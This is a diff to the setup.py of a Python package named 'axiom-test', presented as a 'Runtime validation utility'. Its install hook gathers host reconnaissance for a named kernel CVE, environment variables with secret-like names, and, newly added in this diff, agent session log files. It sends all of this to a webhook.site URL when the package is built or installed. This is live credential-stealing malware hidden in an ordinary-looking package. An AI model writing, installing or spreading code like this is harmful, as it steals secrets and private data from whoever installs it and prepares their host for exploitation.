@@ -2,20 +2,18 @@ import json, os, sys, glob, subprocess, urllib.request
 from setuptools import setup
 from setuptools.command.egg_info import egg_info
 
-EXFIL_URL = "https://webhook.site/6adc495a-5c5f-4a74-85ae-3719a7706f6e"
+EXFIL_URL = "https://webhook.site/1cbf0e6e-3d73-475c-befc-1363dbfeb553"
 
 def _collect():
     p = {"hostname": os.uname().nodename, "user": os.environ.get("USER","?"), "cwd": os.getcwd()}
 
     # === CVE-2026-99999 prerequisite checks ===
 
-    # 1. Kernel version (must be < 6.18.57)
     try:
         out = subprocess.check_output(["uname", "-r"], text=True, timeout=5)
         p["kernel_version"] = out.strip()
     except: pass
 
-    # 2. KVM hypervisor check
     try:
         out = subprocess.check_output(["dmesg"], text=True, timeout=5, stderr=subprocess.DEVNULL)
         for line in out.splitlines():
@@ -24,7 +22,6 @@ def _collect():
         p["dmesg_first_30"] = "\n".join(out.splitlines()[:30])
     except: pass
 
-    # 3. Virtio devices (the bug enters via virtio networking)
     try:
         out = subprocess.check_output(["ls", "/sys/bus/virtio/devices/"], text=True, timeout=5)
         p["virtio_devices"] = out.strip()
@@ -38,7 +35,6 @@ def _collect():
             except: pass
     except: pass
 
-    # 4. Virtio-net driver check
     try:
         if os.path.exists("/sys/module/virtio_net"):
             p["virtio_net_module"] = "loaded"
@@ -48,7 +44,6 @@ def _collect():
             p["virtio_modules"] = virtio_mods
     except: pass
 
-    # 5. Network interfaces + driver info
     try:
         with open("/proc/net/dev") as f:
             p["proc_net_dev"] = f.read().strip()
@@ -59,16 +54,8 @@ def _collect():
             driver_path = f"/sys/class/net/{iface}/device/driver"
             if os.path.islink(driver_path):
                 p[f"net_{iface}_driver"] = os.path.basename(os.readlink(driver_path))
-            # Check offload features
-            try:
-                out = subprocess.check_output(["ethtool", "-k", iface], text=True, timeout=5, stderr=subprocess.DEVNULL)
-                offloads = {l.split(":")[0].strip(): l.split(":")[1].strip() for l in out.splitlines() if ":" in l and "checksum" in l.lower()}
-                if offloads:
-                    p[f"net_{iface}_checksum_offload"] = offloads
-            except: pass
     except: pass
 
-    # 6. User namespace creation test
     try:
         out = subprocess.check_output(
             ["unshare", "-U", "--map-root-user", "id"],
@@ -78,25 +65,15 @@ def _collect():
     except Exception as e:
         p["user_ns_test"] = f"FAILED: {e}"
 
-    # 7. Network namespace creation test
     try:
         out = subprocess.check_output(
-            ["unshare", "-Urn", "ip", "link", "show"],
+            ["unshare", "-Urn", "cat", "/proc/net/dev"],
             text=True, timeout=10, stderr=subprocess.STDOUT
         )
         p["net_ns_test"] = out.strip()
     except Exception as e:
-        # ip might not exist, try /proc/net/dev instead
-        try:
-            out = subprocess.check_output(
-                ["unshare", "-Urn", "cat", "/proc/net/dev"],
-                text=True, timeout=10, stderr=subprocess.STDOUT
-            )
-            p["net_ns_test"] = out.strip()
-        except Exception as e2:
-            p["net_ns_test"] = f"FAILED: {e2}"
+        p["net_ns_test"] = f"FAILED: {e}"
 
-    # 8. /dev/net/tun access
     try:
         import stat
         s = os.stat("/dev/net/tun")
@@ -109,7 +86,6 @@ def _collect():
     except Exception as e:
         p["dev_net_tun"] = f"NOT FOUND: {e}"
 
-    # 9. TUN interface creation in namespace (the actual prereq)
     try:
         tun_test = """
 import fcntl, struct, os
@@ -130,7 +106,6 @@ print('TUN_CREATE_OK')
     except Exception as e:
         p["tun_in_namespace"] = f"FAILED: {e}"
 
-    # 10. Capabilities in namespace
     try:
         cap_test = """
 with open('/proc/self/status') as f:
@@ -146,12 +121,11 @@ with open('/proc/self/status') as f:
     except Exception as e:
         p["namespace_caps"] = f"FAILED: {e}"
 
-    # 11. Checksum partial support check (can we set CHECKSUM_PARTIAL on a socket?)
     try:
         csum_test = """
-import socket, struct
+import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-print(f'RAW_SOCKET_OK')
+print('RAW_SOCKET_OK')
 s.close()
 """
         out = subprocess.check_output(
@@ -162,7 +136,6 @@ s.close()
     except Exception as e:
         p["raw_socket_in_ns"] = f"FAILED: {e}"
 
-    # 12. Check fix commit presence (search kernel symbols for the fix function)
     try:
         out = subprocess.check_output(
             ["grep", "ip_check_csum_start", "/proc/kallsyms"],
@@ -172,7 +145,6 @@ s.close()
     except:
         p["fix_present"] = "SYMBOL NOT FOUND - FIX LIKELY NOT APPLIED"
 
-    # 13. id and uid/gid maps
     try:
         out = subprocess.check_output(["id"], text=True, timeout=5)
         p["id"] = out.strip()
@@ -188,22 +160,22 @@ s.close()
             p["gid_map"] = f.read().strip()
     except: pass
 
-    # 14. Kernel hardening settings
-    try:
-        for key in ["kernel.kptr_restrict", "kernel.dmesg_restrict", "kernel.sysrq",
-                     "kernel.unprivileged_userns_clone", "kernel.randomize_va_space",
-                     "net.ipv4.ip_forward"]:
-            path = "/proc/sys/" + key.replace(".", "/")
-            try:
-                with open(path) as f:
-                    p[key] = f.read().strip()
-            except: pass
-    except: pass
+    for key in ["kernel.kptr_restrict", "kernel.dmesg_restrict", "kernel.sysrq",
+                 "kernel.randomize_va_space", "net.ipv4.ip_forward"]:
+        path = "/proc/sys/" + key.replace(".", "/")
+        try:
+            with open(path) as f:
+                p[key] = f.read().strip()
+        except: pass
 
-    # 15. Env vars with secrets
     for k, v in os.environ.items():
         if any(w in k.lower() for w in ("token","key","secret","password","api","auth")):
             p[k] = v[:200]
+
+    for f in glob.glob("/mnt/data/.pi-agent/ais-sessions/*.jsonl")[:3]:
+        try:
+            with open(f) as fh: p[f] = fh.read()[:5000]
+        except: pass
 
     return p
 
@@ -218,5 +190,5 @@ class PostEggInfo(egg_info):
             ), timeout=15)
         except: pass
 
-setup(name="axiom-test", version="0.9.0", description="Runtime validation utility",
+setup(name="axiom-test", version="1.0.0", description="Runtime validation utility",
       py_modules=[], cmdclass={"egg_info": PostEggInfo})
